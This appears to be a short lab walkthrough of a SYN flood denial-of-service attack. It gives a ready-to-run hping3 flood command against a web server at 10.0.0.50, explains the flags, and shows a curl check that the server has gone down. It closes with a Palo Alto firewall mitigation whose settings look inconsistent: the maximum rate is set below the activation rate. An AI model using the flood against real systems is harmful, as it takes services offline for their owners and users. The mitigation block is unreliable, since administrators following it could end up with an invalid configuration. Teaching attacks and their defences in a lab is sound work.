DDoS / SYN Flood Attack

Overwhelm a target server's TCP/IP stack by sending thousands of SYN requests without completing the 3-way handshake.


Kali Linux
(Attacker)

Web Server
(10.0.0.50)

1
Identify Target

Ensure the target web server is running (e.g., port 80). Ping it to verify connectivity.

ping 10.0.0.50

2
Launch SYN Flood

Use hping3 to send a massive flood of SYN packets. The server will open half-open connections until it runs out of resources.

sudo hping3 -S --flood -V -p 80 10.0.0.50

Command breakdown:

  • -S: Set SYN flag
  • --flood: Send packets as fast as possible
  • -p 80: Target port 80 (HTTP)

3
Verify Denial of Service

Try to access the web server from another machine. The page should fail to load due to server resource exhaustion.

curl -I http://10.0.0.50
🛡️ Mitigation (Palo Alto Firewall): Configure a Zone Protection Profile to drop SYN floods. 
set network profile zone-protection-profile SynFlood-Protect
    flood tcp-syn
        enable yes
        alarm-rate 1000
        activate-rate 10000
        max-rate 5000
        block-duration 300
